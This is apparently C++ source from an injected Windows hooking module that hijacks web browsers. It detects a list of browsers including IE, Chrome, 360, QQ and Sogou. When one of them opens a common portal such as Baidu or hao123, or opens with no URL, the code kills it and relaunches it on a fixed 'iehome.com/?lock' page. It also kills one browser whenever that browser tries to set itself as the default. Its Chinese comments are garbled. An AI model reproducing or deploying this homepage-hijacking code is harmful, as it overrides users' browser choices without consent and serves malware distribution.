#include "HTTPRedirect.h"

#include "FakeCommandLine.h"

#include "HookControl\HookHelp.h"
#include "HookControl\InlineHook.h"
#include "HookControl\IATHook.h"

namespace {
#define _W(_str)		L##_str
	const wchar_t * ptszHitProcessNameLists[] = {
		_W("iexplore.exe")/* IE ���������*/,

		_W("liebao.exe")/* �Ա� ���������*/,
		_W("360se.exe")/* 360��ȫ ���������*/,
		_W("360chrome.exe")/* 360���� ���������*/,
		_W("chrome.exe")/* Chrome ���������*/,
		_W("qqbrowser.exe")/* QQ ���������*/,
		_W("sogouexplorer.exe")/* �ѹ� ���������*/,
		_W("baidubrowser.exe")/* �ٶ� ���������*/,
		_W("f1browser.exe")/* F1 ���������*/,
		_W("2345explorer.exe")/* 2345 ���������*/,

		_W("yidian.exe")/* һ������� �������� Ӧ���ǵ���ʵ���ƹ�˾��*/
	};
	const wchar_t * ptszHitRedirectURLLists[] = {
		_W("0.baidu.com/?"),
		_W("www.baidu.com/?"),
		_W("www.baidu.com/home?"),
		_W("www.baidu.com/index.php?")
		_W("www.sogou.com/index"),
		_W("www.hao123.com/?"),
		_W("www.2345.com/?"),
		_W("hao.360.cn/?"),
		_W("123.sogou.com/?"),

		_W(".index66.com")
	};

	const wchar_t * __cdecl wcsistr(const wchar_t * str1, const wchar_t * str2)
	{
		const wchar_t *cp = (const wchar_t *)str1;
		const wchar_t *s1, *s2;
		wchar_t c1 = L'\0', c2 = L'\0';

		if (!*str2)
			return((const wchar_t *)str1);

		while (*cp)
		{
			s1 = cp;
			s2 = (const wchar_t *)str2;
			c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
			c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;

			while (c1 && c2 && !(c1 - c2))
			{
				s1++, s2++;

				c1 = (*s1 >= 'a' && *s1 <= 'z') ? *s1 - ('a' - 'A') : *s1;
				c2 = (*s2 >= 'a' && *s2 <= 'z') ? *s2 - ('a' - 'A') : *s2;
			}

			if (!*s2)
				return(cp);

			cp++;
		}

		return(NULL);

	}

	typedef LONG(WINAPI *PNTQUERYINFORMATIONPROCESS)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);

	inline PPEB GetCurrentProcessPEB()
	{
		return PPEB(__readfsdword(0x30));
	}

	int GetParentProcessId(DWORD dwProcessId)
	{
		LONG                      status = 0;
		DWORD                     dwParentPID = 0;
		PROCESS_BASIC_INFORMATION pbi = {0};

		PNTQUERYINFORMATIONPROCESS NtQueryInformationProcess = (PNTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle("ntdll"), "NtQueryInformationProcess");
		
		if (!NtQueryInformationProcess)
			return -1;

		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId);

		if (NULL == hProcess) {
			return -1;
		}

		if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, (PVOID)&pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL))) {
			dwParentPID = (DWORD)pbi.Reserved3;//InheritedFromUniqueProcessId
		}

		CloseHandle(hProcess);

		return dwParentPID;
	}

	bool GetProcessNameByProcessId(DWORD dwProcessID, LPWSTR pwszProcessName)
	{
		bool bIsFind = false;
		PROCESSENTRY32W pe32 = { 0 };
		HANDLE hProcessSnap = INVALID_HANDLE_VALUE;

		hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

		pe32.dwSize = sizeof(PROCESSENTRY32W);

		if (!Process32FirstW(hProcessSnap, &pe32))
			return NULL;

		do
		{
			if (pe32.th32ProcessID == dwProcessID)
			{
				bIsFind = true;
				wcscpy(pwszProcessName,pe32.szExeFile);
				break;
			}

			pe32.dwSize = sizeof(PROCESSENTRY32W);
		} while (Process32NextW(hProcessSnap, &pe32));

		CloseHandle(hProcessSnap);

		return bIsFind;
	}

	bool RegRead(HKEY hRootKey, LPCWSTR lpSubKey, LPCWSTR lpValueName, BYTE   * pBuffer, size_t sizeBufferSize)
	{
		HKEY hKey;
		bool bIsOK = false;
		DWORD dwType = 0;
		DWORD dwBufferSize = sizeBufferSize;

		if (RegOpenKeyW(hRootKey, lpSubKey, &hKey) != ERROR_SUCCESS)
			return   false;

		if (RegQueryValueExW(hKey, lpValueName, NULL, &dwType, (LPBYTE)pBuffer, &dwBufferSize) == ERROR_SUCCESS) {//   �ɹ� 
			bIsOK = true;
		}

		RegCloseKey(hKey);

		return   bIsOK;
	}

	bool FindRedirectURL(const wchar_t * pcwszCheckString) {
		for (int i = 0; i < count(ptszHitRedirectURLLists); i++) {
			if (NULL != wcsistr(pcwszCheckString, ptszHitRedirectURLLists[i])) {
				return true;
			}
		}

		return false;
	}

	bool GetUrlAssociationbyProtocol(const wchar_t * pcwszProtocolName, wchar_t * pwszProtocolCommandLine, size_t sizeBufferSize = 2048) {
		WCHAR wszOpenSubKey[MAX_PATH + 1] = { 0 };

		_swprintf(wszOpenSubKey, L"Software\\Microsoft\\Windows\\Shell\\Associations\\UrlAssociations\\%s\\UserChoice", pcwszProtocolName);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, L"Progid", (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		_swprintf(wszOpenSubKey, L"Software\\Classes\\%s\\shell\\open\\command", pwszProtocolCommandLine);

		if (false == RegRead(HKEY_CURRENT_USER, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)
			&& false == RegRead(HKEY_LOCAL_MACHINE, wszOpenSubKey, NULL, (BYTE *)pwszProtocolCommandLine, sizeBufferSize)) {
			pwszProtocolCommandLine[0] = L'\0';
			return false;
		}

		return true;
	}
}

bool Hook::StartCommandLineHook()
{
	bool bIsHookProcess = false;
	PPEB pProcessPEB = GetCurrentProcessPEB();

	if (NULL == pProcessPEB || NULL == pProcessPEB->ProcessParameters) {
		return false;
	}

	LPCWSTR pcwszStartCommandLine = pProcessPEB->ProcessParameters->CommandLine.Buffer;
	LPCWSTR pcwszStartImagePathName = pProcessPEB->ProcessParameters->ImagePathName.Buffer;

	Global::Log.PrintW(LOGOutputs, L"[% 5u] EXEC: %s", GetCurrentProcessId(), pcwszStartImagePathName);

	for (int i = 0; i < count(ptszHitProcessNameLists); i++) {
		bIsHookProcess = true;
		if (NULL != wcsistr(pcwszStartImagePathName, ptszHitProcessNameLists[i])) {
			break;
		}

		bIsHookProcess = false;
	}

	if (false == bIsHookProcess) {
		return false;
	}

	WCHAR wszParentProcessName[MAX_PATH + 1] = { 0 };
	DWORD dwParentProcessID = GetParentProcessId(GetCurrentProcessId());

	wszParentProcessName[0] = L'\\';
	if (-1 == dwParentProcessID || false == GetProcessNameByProcessId(dwParentProcessID, &wszParentProcessName[1])) {
		return false;
	}

	if (NULL != wcsistr(pcwszStartImagePathName, wszParentProcessName)) {
		Global::Log.PrintW(LOGOutputs, L"[% 5u] Parent Name: %s", GetCurrentProcessId(), wszParentProcessName);
		return false;
	}

	WCHAR wszProtocolCommandLine[1024 + 1] = { 0 };

	if (false == GetUrlAssociationbyProtocol(L"http", wszProtocolCommandLine, sizeof(wszProtocolCommandLine))) {
		return false;
	}

	LPCWSTR pcwszNewParameter = L"http://www.iehome.com/?lock";
	Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association: %s", GetCurrentProcessId(), wszProtocolCommandLine);

	bool bIsHit = FindRedirectURL(pcwszStartCommandLine);

	if (NULL != wcsistr(wszProtocolCommandLine, pcwszStartImagePathName)) {
		Global::Log.PrintW(LOGOutputs, L"[% 5u] HTTP Association Hit: %s", GetCurrentProcessId(), wszProtocolCommandLine);

		if (NULL == wcsistr(pcwszStartCommandLine, L"http")) {
			bIsHit = true; // ����ʹ�ô˷���û�취����Ƿ�������Ĭ�������,�� QQ�ռ�Ȳ���ͨ�������д򿪶���ͨ��Э��򿪵�. ���Ի�����
		}

		if (NULL != wcsistr(pcwszStartCommandLine, L"-")) {
			bIsHit = false; // ���Ĭ�������ͨ����������,ֱ�ӷŹ�
		}

		if (false == bIsHit) {
			pcwszNewParameter = NULL;
		}
	}

	///   ��д����״̬���

	Global::Log.PrintW(LOGOutputs, L"[% 5u] CMD: %s", GetCurrentProcessId(), pcwszStartCommandLine);

	////////////////////////////////////////////////////////////////////////////////////////////
	// �������

	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\qqbrowser.exe")) {// QQ�����

		if (NULL != wcsistr(pcwszStartCommandLine, L"-sc=desktopshortcut")) { // �����������ͼ�괥����,�������Ź�
			Global::Log.PrintW(LOGOutputs, L"[% 5u] QQ Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
		}
		else {

			if (NULL != wcsistr(pcwszStartCommandLine, L"-fromqq")) { // QQ ������, ��򿪿ռ��
				pcwszNewParameter = NULL;
			}

			if (NULL == wcsistr(pcwszStartCommandLine, L"http") && NULL == wcsistr(pcwszStartCommandLine, L"www.")) { // ֻҪ������ URL �������нٳ�
				pcwszNewParameter = NULL;
			}
		}
	}

	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\2345explorer.exe")) {// F1����� 
		if (NULL != wcsistr(pcwszStartCommandLine, L"--shortcut=desktop")) { // ͨ�������ݷ�ʽ����
			pcwszNewParameter = L"http://www.iehome.com/?lock";
			Global::Log.PrintW(LOGOutputs, L"[% 5u] 2345 Desktopshortcut Hit: %s", GetCurrentProcessId(), pcwszStartCommandLine);
		}
	}

	if (false == bIsHit && NULL != wcsistr(pcwszStartImagePathName, L"\\f1browser.exe")) {// F1����� 
		if (NULL != wcsistr(pcwszStartCommandLine, L"set-default")) { // ��ֹ������Ĭ�������
			Global::Log.PrintW(LOGOutputs, L"[% 5u] Terminated CommandLine Exec: %s", GetCurrentProcessId(), pcwszStartCommandLine);
			::ExitProcess(0);
			::TerminateProcess(::GetCurrentProcess(), 0);
		}
	}

	//////////////////////////////////////////////////////////////////////////////////////////////
	// ִ���ض���

	if (NULL != pcwszNewParameter) {
		STARTUPINFOW siStratupInfo = { 0 };
		PROCESS_INFORMATION piProcessInformation = { 0 };

		_swprintf(wszProtocolCommandLine, L"\"%s\" %s", pcwszStartImagePathName, pcwszNewParameter);

		bool bIsSuccess = false;

		siStratupInfo.cb = sizeof(STARTUPINFO);

		Global::Log.PrintW(LOGOutputs, L"[% 5u] Redirect CMD: %s", GetCurrentProcessId(), wszProtocolCommandLine);

		if (FALSE == ::CreateProcessW(NULL, wszProtocolCommandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &siStratupInfo, &piProcessInformation)) {
			return false;
		}

		ResumeThread(piProcessInformation.hThread);

		CloseHandle(piProcessInformation.hThread);
		CloseHandle(piProcessInformation.hProcess);

		::ExitProcess(0);
		::TerminateProcess(::GetCurrentProcess(), 0);
	}

	return true;
}
